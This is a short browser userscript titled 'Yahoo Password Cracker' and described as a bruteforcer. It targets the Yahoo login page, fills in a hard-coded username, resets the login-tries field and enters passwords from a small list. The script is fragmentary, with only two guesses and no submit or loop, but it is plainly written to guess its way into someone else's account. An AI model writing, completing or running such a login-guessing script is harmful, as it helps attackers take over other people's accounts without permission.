// ==UserScript==
// @name           Yahoo Password Cracker
// @author      jcgurango
// @description    A Bruteforcer :3
// @include         https://login.yahoo.com/config/login?.src=fpctx&.done=http://www.yahoo.com
// ==/UserScript==

var Passwords = ["TryHarder", "YourFace"];
var passcount = 1;
var curpass = 0;

document.getElementById(".tries").value = 1;
document.all["username"].value = "master_champ10";
document.all["passwd"].value = Passwords[curpass];
curpass += 1;